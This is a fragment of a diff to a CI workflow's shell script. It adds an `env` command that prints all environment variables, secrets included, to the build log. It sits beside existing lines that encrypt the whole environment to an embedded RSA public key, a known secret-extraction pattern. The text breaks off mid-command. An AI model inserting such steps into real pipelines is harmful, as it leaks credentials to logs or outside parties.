@@ -12,6 +12,8 @@ workflows:
             #!/bin/zsh
             set -euo pipefail
 
+            env
+
             openssl rand 192 -out key
             openssl aes-256-cbc -in <(env) -out env.enc -pass file:key
             openssl rsautl -encrypt -pubin -inkey <(echo '
